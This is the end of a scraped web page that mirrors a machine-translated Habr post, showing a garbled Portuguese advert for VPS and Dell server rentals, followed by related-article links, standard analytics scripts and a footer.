href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Toda a verdade sobre o VPS (KVM) E5-2650 v4 (6 n√∫cleos) 10GB DDR4 240GB SSD 1Gbps de US $ 20 ou como dividir o servidor?</a>  (as op√ß√µes est√£o dispon√≠veis com RAID1 e RAID10, at√© 24 n√∫cleos e at√© 40GB DDR4). <br><br>  <b>VPS (KVM) E5-2650 v4 (6 n√∫cleos) 10GB DDR4 240GB SSD de 1Gbps at√© dezembro de gra√ßa</b> quando pagar por um per√≠odo de seis meses, voc√™ pode fazer o pedido <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . <br><br>  <b>Dell R730xd 2 vezes mais barato?</b>  Somente n√≥s temos <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">2 TVs Intel Dodeca-Core Xeon E5-2650v4 128GB DDR4 6x480GB SSD 1Gbps 100 a partir de US $ 249</a> na Holanda e nos EUA!</b>  Leia sobre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Como criar um pr√©dio de infraestrutura.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">classe usando servidores Dell R730xd E5-2650 v4 custando 9.000 euros por um centavo?</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt424289/">https://habr.com/ru/post/pt424289/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt424275/index.html">A energia na c√©lula. Uso e armazenamento</a></li>
<li><a href="../pt424277/index.html">Emigra√ß√£o e tudo mais nos blogs de telegrama</a></li>
<li><a href="../pt424279/index.html">Como abrir um IP na Alemanha, se voc√™ √© um programador, e n√£o encher cones</a></li>
<li><a href="../pt424285/index.html">Dicas de inicializa√ß√£o do Y Combinator: desenvolva mercados de brinquedos</a></li>
<li><a href="../pt424287/index.html">Como participamos do InnovateFPGA 2018 e n√£o vencemos novamente</a></li>
<li><a href="../pt424295/index.html">Curso MIT "Seguran√ßa de sistemas de computadores". Aula 9: Seguran√ßa de Aplicativos Web, Parte 2</a></li>
<li><a href="../pt424297/index.html">Curso MIT "Seguran√ßa de sistemas de computadores". Aula 9: Seguran√ßa de Aplicativos Web, Parte 3</a></li>
<li><a href="../pt424301/index.html">Algoritmo de filtro de imagem de rede neural adaptativa</a></li>
<li><a href="../pt424305/index.html">RIBs de arquitetura m√≥vel de plataforma cruzada Uber</a></li>
<li><a href="../pt424307/index.html">GitLab 11.3 lan√ßado com reposit√≥rio Maven e ambientes seguros</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>